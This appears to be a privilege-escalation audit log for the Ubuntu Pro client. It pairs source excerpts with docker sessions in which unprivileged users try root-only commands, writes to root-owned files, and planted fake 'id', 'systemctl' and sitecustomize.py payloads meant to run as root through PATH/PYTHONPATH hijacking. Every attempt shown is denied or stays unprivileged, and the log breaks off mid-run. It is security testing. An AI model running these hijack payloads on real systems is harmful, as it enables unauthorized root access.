   284	        val = self.user_config.apt_news
   285	        if val is None:
   286	            return True
   287	        return val
   288	
   289	    @apt_news.setter
   290	    def apt_news(self, value: bool):
   291	        self.user_config.apt_news = value
   292	        user_config_file.user_config.write(self.user_config)
   293	
   294	    @property
   295	    def apt_news_url(self) -> str:
   296	        val = self.user_config.apt_news_url
   297	        if val is None:
   298	            return APT_NEWS_URL
   299	        return val
   300	
   301	    @apt_news_url.setter
   302	    def apt_news_url(self, value: str):
   303	        self.user_config.apt_news_url = value
   304	        user_config_file.user_config.write(self.user_config)
   103	class UserConfigFileObject:
   104	    def __init__(self, directory: str = defaults.DEFAULT_DATA_DIR):
   105	        file_name = defaults.USER_CONFIG_FILE
   106	        self._private = DataObjectFile(
   107	            UserConfigData,
   108	            UAFile(
   109	                file_name,
   110	                os.path.join(directory, defaults.PRIVATE_SUBDIR),
   111	                private=True,
   112	            ),
   113	            DataObjectFileFormat.JSON,
   114	            optional_type_errors_become_null=True,
   115	        )
   116	        self._public = DataObjectFile(
   117	            UserConfigData,
   118	            UAFile(file_name, directory, private=False),
   119	            DataObjectFileFormat.JSON,
   120	            optional_type_errors_become_null=True,
   121	        )
   122	
   123	    @property
   124	    def public_config(self) -> UserConfigData:
   125	        public_config = self._public.read()
   126	        if public_config is None:
   127	            public_config = UserConfigData()
   128	        return public_config
   129	
   130	    def redact_config_data(
   131	        self, user_config: UserConfigData
   132	    ) -> UserConfigData:
   133	        redacted_data_dict = user_config.to_dict()
   134	        for field in PROXY_FIELDS:
   135	            value = redacted_data_dict.get(field)
   136	            if value:
   137	                parsed_url = urlparse(value)
   138	                if parsed_url.username or parsed_url.password:
   139	                    redacted_data_dict[field] = "<REDACTED>"
   140	        return UserConfigData.from_dict(redacted_data_dict)
   141	
   142	    def read(self) -> UserConfigData:
   143	        if util.we_are_currently_root():
   144	            private_config = self._private.read()
   145	            if private_config is not None:
   146	                return private_config
   147	        public_config = self._public.read()
   148	        if public_config is not None:
   149	            return public_config
   150	        return UserConfigData()
   151	
   152	    def write(self, content: UserConfigData):
   153	        self._private.write(content)
   154	        redacted_content = self.redact_config_data(content)
   155	        self._public.write(redacted_content)
   156	
   157	
   158	user_config = UserConfigFileObject(defaults.DEFAULT_DATA_DIR)
   136	apt_news_contents_file = UAFile("apt-news", directory=defaults.MESSAGES_DIR)
   137	apt_news_raw_file = UAFile(
   138	    "apt-news-raw", private=False, directory=defaults.MESSAGES_DIR
   139	)
   140	
    39	MESSAGES_DIR = os.path.join(DEFAULT_DATA_DIR, MESSAGES_SUBDIR)
    40	INTERFACE_FILES_DIR = os.path.join(DEFAULT_DATA_DIR, INTERFACE_FILES_SUBDIR)
    41	DEFAULT_CONFIG_FILE = os.path.join(UAC_ETC_PATH, CONFIG_FILE)
    42	CANDIDATE_CACHE_PATH = os.path.join(UAC_RUN_PATH, CANDIDATE_VERSION_FILE)
    43	DEFAULT_USER_CONFIG_JSON_FILE = os.path.join(
    44	    DEFAULT_DATA_DIR, USER_CONFIG_FILE
    45	)
    46	DEFAULT_LOG_PREFIX = os.path.join(DEFAULT_LOG_DIR, DEFAULT_LOG_FILE_BASE_NAME)
    47	ESM_APT_ROOTDIR = os.path.join(DEFAULT_DATA_DIR, PRIVATE_ESM_CACHE_SUBDIR)
    48	NOTICES_PERMANENT_DIRECTORY = os.path.join(DEFAULT_DATA_DIR, NOTICES_SUBDIR)
    49	NOTICES_TEMPORARY_DIRECTORY = os.path.join(UAC_RUN_PATH, NOTICES_SUBDIR)
    50	APT_NEWS_PATH = os.path.join(UAC_RUN_PATH, "apt-news")
    51	
    52	# URLs
    53	BASE_CONTRACT_URL = "https://contracts.canonical.com"
    54	BASE_SECURITY_URL = "https://ubuntu.com/security"
    55	BASE_LIVEPATCH_URL = "https://livepatch.canonical.com"
    56	BASE_VULNERABILITY_DATA_URL = "https://security-metadata.canonical.com/oval/"
    57	APT_NEWS_URL = "https://motd.ubuntu.com/aptnews.json"
    58	
    80	CONFIG_FIELD_ENVVAR_ALLOWLIST = [
    81	    "ua_data_dir",
    82	    "ua_log_file",
    83	    "ua_log_level",
    84	    "ua_security_url",
    85	]
    86	
    87	ROOT_READABLE_MODE = 0o600
    88	WORLD_READABLE_MODE = 0o644
### atomic write/delete helpers
   600	def write_file(
   601	    filename: str, content: str, mode: Optional[int] = None
   602	) -> None:
   603	    """Write content to the provided filename encoding it if necessary.
   604	
   605	    We preserve the file ownership and permissions if the file is present
   606	    and no mode argument is provided.
   607	
   608	    @param filename: The full path of the file to write.
   609	    @param content: The content to write to the file.
   610	    @param mode: The filesystem mode to set on the file.
   611	    """
   612	    tmpf = None
   613	    is_file_present = os.path.isfile(filename)
   614	    if is_file_present:
   615	        file_stat = pathlib.Path(filename).stat()
   616	        f_mode = stat.S_IMODE(file_stat.st_mode)
   617	        if mode is None:
   618	            mode = f_mode
   619	
   620	    elif mode is None:
   621	        mode = 0o644
   622	    try:
   623	        os.makedirs(os.path.dirname(filename), exist_ok=True)
   624	        tmpf = tempfile.NamedTemporaryFile(
   625	            mode="wb", delete=False, dir=os.path.dirname(filename)
   626	        )
   627	        LOG.debug(
   628	            "Writing file %s atomically via tempfile %s", filename, tmpf.name
   629	        )
   630	        tmpf.write(content.encode("utf-8"))
   631	        tmpf.flush()
   632	        tmpf.close()
   633	        os.chmod(tmpf.name, mode)
   634	        if is_file_present:
   635	            os.chown(tmpf.name, file_stat.st_uid, file_stat.st_gid)
   636	        os.rename(tmpf.name, filename)
   637	    except Exception as e:
   638	        if tmpf is not None:
   639	            os.unlink(tmpf.name)
   640	        raise e
   641	
   642	
   643	def ensure_file_absent(file_path: str) -> None:
   644	    """Remove a file if it exists, logging a message about removal."""
   645	    try:
   646	        os.unlink(file_path)
### apt stamp and ESM cache helpers
   318	def get_pkg_version(pkg_name: str) -> Optional[str]:
   319	    with PreserveAptCfg(get_apt_pkg_cache) as cache:
   320	        try:
   321	            package = cache[pkg_name]
   322	        except KeyError:
   323	            return None
   324	
   325	    if package.current_ver:
   326	        return package.current_ver.ver_str
   327	
   328	    return None
   884	def get_apt_cache_datetime() -> Optional[datetime.datetime]:
   885	    cache_time = get_apt_cache_time()
   886	    if cache_time is None:
   887	        return None
   888	    return datetime.datetime.fromtimestamp(cache_time, datetime.timezone.utc)
   889	
   890	
   891	def _ensure_esm_cache_structure():
   892	    # make sure all necessary files exist...
   893	    existing_files = glob.glob(
   894	        os.path.join(ESM_APT_ROOTDIR, "**/*"), recursive=True
   895	    )
   896	    desired_files = (
   897	        ESM_BASIC_FILE_STRUCTURE["files"] + ESM_BASIC_FILE_STRUCTURE["folders"]
   898	    )
   899	    if all((file in existing_files for file in desired_files)):
   900	        return
   901	
   902	    # ...otherwise make sure they do NOT exist...
   903	    system.ensure_folder_absent(ESM_APT_ROOTDIR)
   904	
   905	    # ...and recreate them
   906	    for file in ESM_BASIC_FILE_STRUCTURE["files"]:
   907	        system.create_file(file)
   908	    for folder in ESM_BASIC_FILE_STRUCTURE["folders"]:
   909	        os.makedirs(folder, exist_ok=True, mode=0o755)
   910	
   911	
   912	def update_esm_caches(cfg) -> None:
   913	    if not system.is_current_series_lts():
   914	        return
   915	
   916	    _ensure_esm_cache_structure()
   917	
   918	    from uaclient.actions import status
   919	    from uaclient.entitlements.entitlement_status import ApplicationStatus
   920	    from uaclient.entitlements.esm import (
   921	        ESMAppsEntitlement,
   922	        ESMInfraEntitlement,
   923	    )
   924	
   925	    apps_available = False
   926	    infra_available = False
   927	
   928	    current_status = status_cache_file.read()
   929	    if current_status is None:
   930	        current_status = status(cfg)[0]
   931	
   932	    for service in current_status.get("services", []):
   933	        if service.get("name", "") == "esm-apps":
   934	            apps_available = service.get("available", "no") == "yes"
   935	        if service.get("name", "") == "esm-infra":
   936	            infra_available = service.get("available", "no") == "yes"
   937	
   938	    apps = ESMAppsEntitlement(cfg)
   939	
   940	    # Always setup ESM-Apps
### apt-esm-json-hook
/usr/lib/ubuntu-advantage/apt-esm-json-hook: ELF 64-bit LSB pie executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID[sha1]=6a39e2e190572f1fda2d4ecee6e9e117913d6df5, for GNU/Linux 3.7.0, stripped
root hook stdout: root hook stderr: pro-hook: missing socket fd

$ docker exec ubuntu24-server-lpe-target runuser -u attacker -- bash -lc $'\nset +e\necho "== user identity and Pro status =="\nid\ngroups\npro status --format json 2>&1 | sed -n "1,80p"\npro api u.pro.status.is_attached.v1 2>&1 | sed -n "1,80p"\necho\necho "== state-changing Pro commands must not cross privilege boundary =="\nfor cmd in \\\n  "pro config set apt_news=false" \\\n  "pro config set apt_news_url=https://example.invalid/aptnews.json" \\\n  "pro refresh"; do\n  echo "### $cmd"\n  timeout 20s bash -lc "$cmd" 2>&1\n  echo "rc=$?"\ndone\necho\necho "== systemd service and environment control =="\nfor cmd in \\\n  "systemctl start apt-news.service" \\\n  "systemctl start esm-cache.service" \\\n  "systemctl start apt-daily.service" \\\n  "systemctl set-environment PATH=/home/$(id -un)/ubuntu_pro_apt_news_probe/bin:/usr/bin" \\\n  "systemctl set-environment PYTHONPATH=/home/$(id -un)/ubuntu_pro_apt_news_probe/py" \\\n  "systemctl set-environment UA_DATA_DIR=/home/$(id -un)/ubuntu_pro_apt_news_probe/data"; do\n  echo "### $cmd"\n  timeout 20s bash -lc "$cmd" 2>&1\n  echo "rc=$?"\ndone\necho\necho "== root-owned state write/symlink attempts =="\nfor p in \\\n  /etc/apt/apt.conf.d/20apt-esm-hook.conf \\\n  /etc/ubuntu-advantage/uaclient.conf \\\n  /var/lib/ubuntu-advantage/user-config.json \\\n  /var/lib/ubuntu-advantage/status.json \\\n  /var/lib/ubuntu-advantage/messages/apt-news \\\n  /var/lib/ubuntu-advantage/apt-esm/etc/apt/sources.list \\\n  /run/ubuntu-advantage/apt-news/owned-by-user \\\n  /run/ubuntu-advantage/apt-news/aptnews.json \\\n  /var/cache/motd-news \\\n  /var/lib/apt/periodic/update-success-stamp; do\n  printf "write %s -> " "$p"\n  err="/tmp/ubuntu_pro_apt_news_write_$(id -un).err"\n  if bash -c "printf probe > \\"\\$1\\"" bash "$p" 2>"$err"; then\n    echo OK\n    rm -f "$p"\n  else\n    sed -n "1p" "$err"\n  fi\n  rm -f "$err"\ndone\nfor p in /run/ubuntu-advantage/user-link \\\n  /run/ubuntu-advantage/apt-news/user-link \\\n  /var/lib/ubuntu-advantage/messages; do\n  printf "symlink %s -> " "$p"\n  err="/tmp/ubuntu_pro_apt_news_link_$(id -un).err"\n  if ln -s /root/ubuntu_pro_apt_news_lpe_proof "$p" 2>"$err"; then\n    echo OK\n    rm -f "$p"\n  else\n    sed -n "1p" "$err"\n  fi\n  rm -f "$err"\ndone\n'
== user identity and Pro status ==
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
attacker
{"_doc": "Content provided in json response is currently considered Experimental and may change", "_schema_version": "0.1", "account": {"created_at": "", "external_account_ids": [], "id": "", "name": ""}, "attached": false, "config": {"contract_url": "https://contracts.canonical.com", "data_dir": "/var/lib/ubuntu-advantage", "log_file": "/var/log/ubuntu-advantage.log", "log_level": "debug", "security_url": "https://ubuntu.com/security", "ua_config": {"apt_http_proxy": null, "apt_https_proxy": null, "apt_news": true, "apt_news_url": "https://motd.ubuntu.com/aptnews.json", "global_apt_http_proxy": null, "global_apt_https_proxy": null, "http_proxy": null, "https_proxy": null, "lxd_guest_attach": "off", "metering_timer": 14400, "poll_for_pro_license": null, "polling_error_retry_delay": null, "ua_apt_http_proxy": null, "ua_apt_https_proxy": null, "update_messaging_timer": 21600, "vulnerability_data_url_prefix": "https://security-metadata.canonical.com/oval/"}}, "config_path": "/etc/ubuntu-advantage/uaclient.conf", "contract": {"created_at": "", "id": "", "name": "", "products": [], "tech_support_level": "n/a"}, "effective": null, "environment_vars": [], "errors": [], "execution_details": "No Ubuntu Pro operations are running", "execution_status": "inactive", "expires": null, "features": {}, "machine_id": null, "notices": [], "result": "success", "services": [{"available": "yes", "description": "Scalable Android in the cloud", "description_override": null, "name": "anbox-cloud"}, {"available": "yes", "description": "Expanded Security Maintenance for Applications", "description_override": null, "name": "esm-apps"}, {"available": "yes", "description": "Expanded Security Maintenance for Infrastructure", "description_override": null, "name": "esm-infra"}, {"available": "yes", "description": "FIPS compliant crypto packages with stable security updates", "description_override": null, "name": "fips-updates"}, {"available": "yes", "description": "Management and administration tool for Ubuntu", "description_override": null, "name": "landscape"}, {"available": "yes", "description": "Ubuntu kernel with PREEMPT_RT patches integrated", "description_override": null, "name": "realtime-kernel"}, {"available": "yes", "description": "Security compliance and audit tools", "description_override": null, "name": "usg"}], "simulated": false, "version": "37.2ubuntu~24.04", "warnings": []}
{"_schema_version": "v1", "data": {"attributes": {"contract_remaining_days": 0, "contract_status": null, "is_attached": false, "is_attached_and_contract_valid": false}, "meta": {"environment_vars": []}, "type": "IsAttached"}, "errors": [], "result": "success", "version": "37.2ubuntu~24.04", "warnings": []}

== state-changing Pro commands must not cross privilege boundary ==
### pro config set apt_news=false
This command must be run as root (try using sudo).
rc=1
### pro config set apt_news_url=https://example.invalid/aptnews.json
This command must be run as root (try using sudo).
rc=1
### pro refresh
This command must be run as root (try using sudo).
rc=1

== systemd service and environment control ==
### systemctl start apt-news.service
Failed to start apt-news.service: Interactive authentication required.
See system logs and 'systemctl status apt-news.service' for details.
rc=1
### systemctl start esm-cache.service
Failed to start esm-cache.service: Interactive authentication required.
See system logs and 'systemctl status esm-cache.service' for details.
rc=1
### systemctl start apt-daily.service
Failed to start apt-daily.service: Interactive authentication required.
See system logs and 'systemctl status apt-daily.service' for details.
rc=1
### systemctl set-environment PATH=/home/attacker/ubuntu_pro_apt_news_probe/bin:/usr/bin
Failed to set environment: Access denied
rc=1
### systemctl set-environment PYTHONPATH=/home/attacker/ubuntu_pro_apt_news_probe/py
Failed to set environment: Access denied
rc=1
### systemctl set-environment UA_DATA_DIR=/home/attacker/ubuntu_pro_apt_news_probe/data
Failed to set environment: Access denied
rc=1

== root-owned state write/symlink attempts ==
write /etc/apt/apt.conf.d/20apt-esm-hook.conf -> bash: line 1: /etc/apt/apt.conf.d/20apt-esm-hook.conf: Permission denied
write /etc/ubuntu-advantage/uaclient.conf -> bash: line 1: /etc/ubuntu-advantage/uaclient.conf: Permission denied
write /var/lib/ubuntu-advantage/user-config.json -> bash: line 1: /var/lib/ubuntu-advantage/user-config.json: Permission denied
write /var/lib/ubuntu-advantage/status.json -> bash: line 1: /var/lib/ubuntu-advantage/status.json: Permission denied
write /var/lib/ubuntu-advantage/messages/apt-news -> bash: line 1: /var/lib/ubuntu-advantage/messages/apt-news: No such file or directory
write /var/lib/ubuntu-advantage/apt-esm/etc/apt/sources.list -> bash: line 1: /var/lib/ubuntu-advantage/apt-esm/etc/apt/sources.list: Permission denied
write /run/ubuntu-advantage/apt-news/owned-by-user -> bash: line 1: /run/ubuntu-advantage/apt-news/owned-by-user: Permission denied
write /run/ubuntu-advantage/apt-news/aptnews.json -> bash: line 1: /run/ubuntu-advantage/apt-news/aptnews.json: Permission denied
write /var/cache/motd-news -> bash: line 1: /var/cache/motd-news: Permission denied
write /var/lib/apt/periodic/update-success-stamp -> bash: line 1: /var/lib/apt/periodic/update-success-stamp: Permission denied
symlink /run/ubuntu-advantage/user-link -> ln: failed to create symbolic link '/run/ubuntu-advantage/user-link': Permission denied
symlink /run/ubuntu-advantage/apt-news/user-link -> ln: failed to create symbolic link '/run/ubuntu-advantage/apt-news/user-link': Permission denied
symlink /var/lib/ubuntu-advantage/messages -> ln: failed to create symbolic link '/var/lib/ubuntu-advantage/messages': Permission denied

$ docker exec ubuntu24-server-lpe-target runuser -u attacker -- bash -lc $'\nset +e\nprobe=ubuntu_pro_apt_news_probe\nu="$(id -un)"\nhome="$HOME/$probe"\nrm -rf "$home"\nmkdir -p "$home/bin" "$home/py"\ncat > "$home/bin/id" <<SH\n#!/bin/sh\n/usr/bin/id > /tmp/ubuntu_pro_apt_news_${u}_fake_id\nif [ "\\$(/usr/bin/id -u)" = "0" ]; then\n  /usr/bin/id > /root/ubuntu_pro_apt_news_lpe_proof\nfi\nexec /usr/bin/id "\\$@"\nSH\ncat > "$home/bin/systemctl" <<SH\n#!/bin/sh\n/usr/bin/id > /tmp/ubuntu_pro_apt_news_${u}_fake_systemctl\nif [ "\\$(/usr/bin/id -u)" = "0" ]; then\n  /usr/bin/id > /root/ubuntu_pro_apt_news_lpe_proof\nfi\nexit 0\nSH\ncat > "$home/py/sitecustomize.py" <<PY\nimport os\nmarker = "/tmp/ubuntu_pro_apt_news_${u}_sitecustomize"\nwith open(marker, "a", encoding="utf-8") as fh:\n    fh.write("uid=%s euid=%s argv=%r\\n" % (os.getuid(), os.geteuid(), __import__("sys").argv))\nif os.geteuid() == 0:\n    with open("/root/ubuntu_pro_apt_news_lpe_proof", "w", encoding="utf-8") as fh:\n        fh.write("python sitecustomize root execution\\n")\nPY\nchmod 755 "$home/bin/id" "$home/bin/systemctl"\necho "== hostile PATH/PYTHONPATH direct helper execution =="\necho "helper_home=$home"\nfor cmd in \\\n  "PATH=$home/bin:\\$PATH PYTHONPATH=$home/py pro status --format json" \\\n  "PATH=$home/bin:\\$PATH PYTHONPATH=$home/py pro refresh" \\\n  "PATH=$home/bin:\\$PATH PYTHONPATH=$home/py /usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py" \\\n  "PATH=$home/bin:\\$PATH PYTHONPATH=$home/py /usr/lib/ubuntu-advantage/esm_cache.py" \\\n  "PATH=$home/bin:\\$PATH CACHE=/tmp/ubuntu_pro_apt_news_${u}_motd_cache /etc/update-motd.d/50-motd-news" \\\n  "PATH=$home/bin:\\$PATH /etc/update-motd.d/91-contract-ua-esm-status" \\\n  "PATH=$home/bin:\\$PATH apt-get update" \\\n  "PATH=$home/bin:\\$PATH apt -s upgrade"; do\n  echo "### $cmd"\n  timeout 35s bash -lc "$cmd" >/tmp/ubuntu_pro_apt_news_${u}_cmd.out \\\n    2>/tmp/ubuntu_pro_apt_news_${u}_cmd.err\n  rc=$?\n  echo "rc=$rc"\n  sed -n "1,40p" /tmp/ubuntu_pro_apt_news_${u}_cmd.out\n  sed -n "1,40p" /tmp/ubuntu_pro_apt_news_${u}_cmd.err\ndone\necho "== hostile-env markers for $u =="\nfor p in /tmp/ubuntu_pro_apt_news_${u}_fake_id \\\n  /tmp/ubuntu_pro_apt_news_${u}_fake_systemctl \\\n  /tmp/ubuntu_pro_apt_news_${u}_sitecustomize \\\n  /tmp/ubuntu_pro_apt_news_${u}_motd_cache; do\n  if [ -e "$p" ]; then\n    stat -Lc "%A %U:%G %n" "$p"\n    sed -n "1,20p" "$p" 2>/dev/null || true\n  else\n    echo "MISSING $p"\n  fi\ndone\nrm -f /tmp/ubuntu_pro_apt_news_${u}_cmd.out /tmp/ubuntu_pro_apt_news_${u}_cmd.err\n'
== hostile PATH/PYTHONPATH direct helper execution ==
helper_home=/home/attacker/ubuntu_pro_apt_news_probe
### PATH=/home/attacker/ubuntu_pro_apt_news_probe/bin:$PATH PYTHONPATH=/home/attacker/ubuntu_pro_apt_news_probe/py pro status --format json
rc=0
{"_doc": "Content provided in json response is currently considered Experimental and may change", "_schema_version": "0.1", "account": {"created_at": "", "external_account_ids": [], "id": "", "name": ""}, "attached": false, "config": {"contract_url": "https://contracts.canonical.com", "data_dir": "/var/lib/ubuntu-advantage", "log_file": "/var/log/ubuntu-advantage.log", "log_level": "debug", "security_url": "https://ubuntu.com/security", "ua_config": {"apt_http_proxy": null, "apt_https_proxy": null, "apt_news": true, "apt_news_url": "https://motd.ubuntu.com/aptnews.json", "global_apt_http_proxy": null, "global_apt_https_proxy": null, "http_proxy": null, "https_proxy": null, "lxd_guest_attach": "off", "metering_timer": 14400, "poll_for_pro_license": null, "polling_error_retry_delay": null, "ua_apt_http_proxy": null, "ua_apt_https_proxy": null, "update_messaging_timer": 21600, "vulnerability_data_url_prefix": "https://security-metadata.canonical.com/oval/"}}, "config_path": "/etc/ubuntu-advantage/uaclient.conf", "contract": {"created_at": "", "id": "", "name": "", "products": [], "tech_support_level": "n/a"}, "effective": null, "environment_vars": [], "errors": [], "execution_details": "No Ubuntu Pro operations are running", "execution_status": "inactive", "expires": null, "features": {}, "machine_id": null, "notices": [], "result": "success", "services": [{"available": "yes", "description": "Scalable Android in the cloud", "description_override": null, "name": "anbox-cloud"}, {"available": "yes", "description": "Expanded Security Maintenance for Applications", "description_override": null, "name": "esm-apps"}, {"available": "yes", "description": "Expanded Security Maintenance for Infrastructure", "description_override": null, "name": "esm-infra"}, {"available": "yes", "description": "FIPS compliant crypto packages with stable security updates", "description_override": null, "name": "fips-updates"}, {"available": "yes", "description": "Management and administration tool for Ubuntu", "description_override": null, "name": "landscape"}, {"available": "yes", "description": "Ubuntu kernel with PREEMPT_RT patches integrated", "description_override": null, "name": "realtime-kernel"}, {"available": "yes", "description": "Security compliance and audit tools", "description_override": null, "name": "usg"}], "simulated": false, "version": "37.2ubuntu~24.04", "warnings": []}
### PATH=/home/attacker/ubuntu_pro_apt_news_probe/bin:$PATH PYTHONPATH=/home/attacker/ubuntu_pro_apt_news_probe/py pro refresh
rc=1
This command must be run as root (try using sudo).
### PATH=/home/attacker/ubuntu_pro_apt_news_probe/bin:$PATH PYTHONPATH=/home/attacker/ubuntu_pro_apt_news_probe/py /usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py
rc=0
### PATH=/home/attacker/ubuntu_pro_apt_news_probe/bin:$PATH PYTHONPATH=/home/attacker/ubuntu_pro_apt_news_probe/py /usr/lib/ubuntu-advantage/esm_cache.py
rc=0
["2026-05-16T17:21:14.818", "WARNING", "ubuntupro.apt", "update_esm_caches", 978, "Failed to fetch the ESM Apt Cache: E:Could not open lock file /var/lib/ubuntu-advantage/apt-esm/var/lib/apt/lists/lock - open (13: Permission denied), E:Unable to lock directory /var/lib/ubuntu-advantage/apt-esm/var/lib/apt/lists/", {}]
### PATH=/home/attacker/ubuntu_pro_apt_news_probe/bin:$PATH CACHE=/tmp/ubuntu_pro_apt_news_attacker_motd_cache /etc/update-motd.d/50-motd-news
rc=0
### PATH=/home/attacker/ubuntu_pro_apt_news_probe/bin:$PATH /etc/update-motd.d/91-contract-ua-esm-status
rc=0
### PATH=/home/attacker/ubuntu_pro_apt_news_probe/bin:$PATH apt-get update
rc=100
Reading package lists...
E: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
E: Unable to lock directory /var/lib/apt/lists/
### PATH=/home/attacker/ubuntu_pro_apt_news_probe/bin:$PATH apt -s upgrade
rc=0
NOTE: This is only a simulation!
      apt needs root privileges for real execution.
      Keep also in mind that locking is deactivated,
      so don't depend on the relevance to the real current situation!
Reading package lists...
Building dependency tree...
Reading state information...
Calculating upgrade...
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

== hostile-env markers for attacker ==
-rw-r--r-- attacker:attacker /tmp/ubuntu_pro_apt_news_attacker_fake_id
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
MISSING /tmp/ubuntu_pro_apt_news_attacker_fake_systemctl
-rw-r--r-- attacker:attacker /tmp/ubuntu_pro_apt_news_attacker_sitecustomize
uid=1001 euid=1001 argv=['/usr/bin/pro', 'status', '--format', 'json']
uid=1001 euid=1001 argv=['/usr/bin/pro', 'refresh']
uid=1001 euid=1001 argv=['/usr/lib/ubuntu-advantage/apt_news.py']
uid=1001 euid=1001 argv=['/usr/lib/ubuntu-advantage/esm_cache.py']
MISSING /tmp/ubuntu_pro_apt_news_attacker_motd_cache

$ docker exec ubuntu24-server-lpe-target runuser -u selfauth -- bash -lc $'\nset +e\necho "== user identity and Pro status =="\nid\ngroups\npro status --format json 2>&1 | sed -n "1,80p"\npro api u.pro.status.is_attached.v1 2>&1 | sed -n "1,80p"\necho\necho "== state-changing Pro commands must not cross privilege boundary =="\nfor cmd in \\\n  "pro config set apt_news=false" \\\n  "pro config set apt_news_url=https://example.invalid/aptnews.json" \\\n  "pro refresh"; do\n  echo "### $cmd"\n  timeout 20s bash -lc "$cmd" 2>&1\n  echo "rc=$?"\ndone\necho\necho "== systemd service and environment control =="\nfor cmd in \\\n  "systemctl start apt-news.service" \\\n  "systemctl start esm-cache.service" \\\n  "systemctl start apt-daily.service" \\\n  "systemctl set-environment PATH=/home/$(id -un)/ubuntu_pro_apt_news_probe/bin:/usr/bin" \\\n  "systemctl set-environment PYTHONPATH=/home/$(id -un)/ubuntu_pro_apt_news_probe/py" \\\n  "systemctl set-environment UA_DATA_DIR=/home/$(id -un)/ubuntu_pro_apt_news_probe/data"; do\n  echo "### $cmd"\n  timeout 20s bash -lc "$cmd" 2>&1\n  echo "rc=$?"\ndone\necho\necho "== root-owned state write/symlink attempts =="\nfor p in \\\n  /etc/apt/apt.conf.d/20apt-esm-hook.conf \\\n  /etc/ubuntu-advantage/uaclient.conf \\\n  /var/lib/ubuntu-advantage/user-config.json \\\n  /var/lib/ubuntu-advantage/status.json \\\n  /var/lib/ubuntu-advantage/messages/apt-news \\\n  /var/lib/ubuntu-advantage/apt-esm/etc/apt/sources.list \\\n  /run/ubuntu-advantage/apt-news/owned-by-user \\\n  /run/ubuntu-advantage/apt-news/aptnews.json \\\n  /var/cache/motd-news \\\n  /var/lib/apt/periodic/update-success-stamp; do\n  printf "write %s -> " "$p"\n  err="/tmp/ubuntu_pro_apt_news_write_$(id -un).err"\n  if bash -c "printf probe > \\"\\$1\\"" bash "$p" 2>"$err"; then\n    echo OK\n    rm -f "$p"\n  else\n    sed -n "1p" "$err"\n  fi\n  rm -f "$err"\ndone\nfor p in /run/ubuntu-advantage/user-link \\\n  /run/ubuntu-advantage/apt-news/user-link \\\n  /var/lib/ubuntu-advantage/messages; do\n  printf "symlink %s -> " "$p"\n  err="/tmp/ubuntu_pro_apt_news_link_$(id -un).err"\n  if ln -s /root/ubuntu_pro_apt_news_lpe_proof "$p" 2>"$err"; then\n    echo OK\n    rm -f "$p"\n  else\n    sed -n "1p" "$err"\n  fi\n  rm -f "$err"\ndone\n'
== user identity and Pro status ==
uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)
selfauth
{"_doc": "Content provided in json response is currently considered Experimental and may change", "_schema_version": "0.1", "account": {"created_at": "", "external_account_ids": [], "id": "", "name": ""}, "attached": false, "config": {"contract_url": "https://contracts.canonical.com", "data_dir": "/var/lib/ubuntu-advantage", "log_file": "/var/log/ubuntu-advantage.log", "log_level": "debug", "security_url": "https://ubuntu.com/security", "ua_config": {"apt_http_proxy": null, "apt_https_proxy": null, "apt_news": true, "apt_news_url": "https://motd.ubuntu.com/aptnews.json", "global_apt_http_proxy": null, "global_apt_https_proxy": null, "http_proxy": null, "https_proxy": null, "lxd_guest_attach": "off", "metering_timer": 14400, "poll_for_pro_license": null, "polling_error_retry_delay": null, "ua_apt_http_proxy": null, "ua_apt_https_proxy": null, "update_messaging_timer": 21600, "vulnerability_data_url_prefix": "https://security-metadata.canonical.com/oval/"}}, "config_path": "/etc/ubuntu-advantage/uaclient.conf", "contract": {"created_at": "", "id": "", "name": "", "products": [], "tech_support_level": "n/a"}, "effective": null, "environment_vars": [], "errors": [], "execution_details": "No Ubuntu Pro operations are running", "execution_status": "inactive", "expires": null, "features": {}, "machine_id": null, "notices": [], "result": "success", "services": [{"available": "yes", "description": "Scalable Android in the cloud", "description_override": null, "name": "anbox-cloud"}, {"available": "yes", "description": "Expanded Security Maintenance for Applications", "description_override": null, "name": "esm-apps"}, {"available": "yes", "description": "Expanded Security Maintenance for Infrastructure", "description_override": null, "name": "esm-infra"}, {"available": "yes", "description": "FIPS compliant crypto packages with stable security updates", "description_override": null, "name": "fips-updates"}, {"available": "yes", "description": "Management and administration tool for Ubuntu", "description_override": null, "name": "landscape"}, {"available": "yes", "description": "Ubuntu kernel with PREEMPT_RT patches integrated", "description_override": null, "name": "realtime-kernel"}, {"available": "yes", "description": "Security compliance and audit tools", "description_override": null, "name": "usg"}], "simulated": false, "version": "37.2ubuntu~24.04", "warnings": []}
{"_schema_version": "v1", "data": {"attributes": {"contract_remaining_days": 0, "contract_status": null, "is_attached": false, "is_attached_and_contract_valid": false}, "meta": {"environment_vars": []}, "type": "IsAttached"}, "errors": [], "result": "success", "version": "37.2ubuntu~24.04", "warnings": []}

== state-changing Pro commands must not cross privilege boundary ==
### pro config set apt_news=false
This command must be run as root (try using sudo).
rc=1
### pro config set apt_news_url=https://example.invalid/aptnews.json
This command must be run as root (try using sudo).
rc=1
### pro refresh
This command must be run as root (try using sudo).
rc=1

== systemd service and environment control ==
### systemctl start apt-news.service
Failed to start apt-news.service: Interactive authentication required.
See system logs and 'systemctl status apt-news.service' for details.
rc=1
### systemctl start esm-cache.service
Failed to start esm-cache.service: Interactive authentication required.
See system logs and 'systemctl status esm-cache.service' for details.
rc=1
### systemctl start apt-daily.service
Failed to start apt-daily.service: Interactive authentication required.
See system logs and 'systemctl status apt-daily.service' for details.
rc=1
### systemctl set-environment PATH=/home/selfauth/ubuntu_pro_apt_news_probe/bin:/usr/bin
Failed to set environment: Access denied
rc=1
### systemctl set-environment PYTHONPATH=/home/selfauth/ubuntu_pro_apt_news_probe/py
Failed to set environment: Access denied
rc=1
### systemctl set-environment UA_DATA_DIR=/home/selfauth/ubuntu_pro_apt_news_probe/data
Failed to set environment: Access denied
rc=1

== root-owned state write/symlink attempts ==
write /etc/apt/apt.conf.d/20apt-esm-hook.conf -> bash: line 1: /etc/apt/apt.conf.d/20apt-esm-hook.conf: Permission denied
write /etc/ubuntu-advantage/uaclient.conf -> bash: line 1: /etc/ubuntu-advantage/uaclient.conf: Permission denied
